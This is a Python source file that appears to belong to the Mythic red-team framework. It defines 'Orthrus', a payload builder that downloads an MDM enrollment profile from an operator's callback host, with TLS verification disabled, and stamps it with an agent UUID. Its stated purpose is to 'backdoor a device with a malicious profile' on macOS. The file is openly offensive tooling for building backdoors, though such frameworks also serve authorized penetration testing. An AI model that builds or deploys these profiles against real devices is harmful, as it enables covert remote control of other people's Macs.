from mythic_payloadtype_container.PayloadBuilder import *
from mythic_payloadtype_container.MythicCommandBase import *
import asyncio
import os
from distutils.dir_util import copy_tree
import tempfile

# rookuu's imports
from collections import defaultdict
import requests


class Orthrus(PayloadType):
    name = "orthrus"  # name that would show up in the UI
    file_extension = "mobileconfig"  # default file extension to use when creating payloads
    author = "@rookuu"  # author of the payload type
    supported_os = [SupportedOS.MacOS]  # supported OS and architecture combos
    wrapper = False  # does this payload type act as a wrapper for another payloads inside of it?
    wrapped_payloads = []  # if so, which payload types
    note = """This payload uses Apple's MDM protocol to backdoor a device with a malicious profile."""
    supports_dynamic_loading = False  # setting this to True allows users to only select a subset of commands when generating a payload
    build_parameters = {}
    #  the names of the c2 profiles that your agent supports
    c2_profiles = ["mdm"]
    # after your class has been instantiated by the mythic_service in this docker container and all required build parameters have values
    # then this function is called to actually build the payload
    async def build(self) -> BuildResponse:
        resp = BuildResponse(status=BuildStatus.Success)
        
        if len(self.c2info) != 1:
            resp.set_status(BuildStatus.Error)
            resp.set_message(
                "Error building payload - orthrus only supports one c2 profile at a time."
            )

            return resp

        profile = self.c2info[0]
        callback = profile.get_parameters_dict()['callback_host']
       
        r = requests.get("{}/mdm/enroll".format(callback), verify=False)

        if r.status_code != 200:
            raise Exception(r.status_code)

        payload = r.text.replace("<string></string>", "<string>{}</string>".format(self.uuid))

        resp.payload = payload.encode()
        resp.message = "Successfully built!"
        return resp